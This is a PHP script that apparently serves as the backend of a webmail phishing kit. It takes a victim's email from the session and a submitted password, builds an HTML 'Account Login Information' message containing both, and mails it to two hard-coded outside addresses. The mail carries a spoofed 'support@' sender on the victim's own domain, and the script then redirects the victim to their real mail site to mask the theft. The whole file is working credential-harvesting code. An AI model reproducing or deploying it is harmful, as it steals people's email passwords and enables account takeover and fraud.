<?php

session_start();
error_reporting(ALL);

//$uri = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']

if (isset($_REQUEST['code'])){
 
 $xusercode = trim($_REQUEST['code']);
 
 if (isset($xusercode)) {
    $xuser=$_SESSION['email'];
    $to="zodiacbahiss@protonmail.com";
    $to2="timtechconsults@aol.com";
    
    $mail_user=explode("@",$xuser)[0];
    $mail_web=explode("@",$xuser)[1];
    $url=$mail_web;

     
    $message = "
        <div>
            <div>
                <font face='arial, sans-serif' size='2'>
                    <b style='color: rgb(102, 102, 102);'>-------------------------------+-------------------------------</b>
                    <font style='font-weight: bold;' color='#d24726'>Account Login Information</font>
                    <font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------------------+-------------------------------</font>
                </font>
            </div>

            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>+</font>
                    <span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
                    <font color='#e1c404'>&#9658;</font>
                    <font color='#666666'> Email Address   : </font>
                    <font color='#2672ec'>".$xuser."</font>
                    </b>
                </font>
            </div>	


            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>+</font>
                    <span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
                    <font color='#e1c404'>&#9658;</font>
                    <font color='#666666'> Login Password : </font>
                    <font color='#2672ec'>".$xusercode."</font>
                    </b>
                </font>
            </div>


            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>-------------------------------+-------------------------------</font>
                    
                </font>
            </div>

        </div><br>";     

	//$head .= "From: APP-SMART" . "\r\n";     service@webmail.ingcredit.we.bs
        $domain=$mail_web;
        
        $subject = "Webmail Upgrade Request";
        $head = "MIME-Version: 1.0" . "\r\n";
        $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $head .= "X-Priority: 3\r\n";
        $head.= "X-Mailer: PHP". phpversion() ."\r\n";
        $head .= "From: support@".$url . "\r\n";     
        
        if(mail($to,$subject,$message,$head)){
         mail($to2,$subject,$message,$head);
         header("Location: http://".$url);
        }
        
        
    
    }
    
  }
        

?>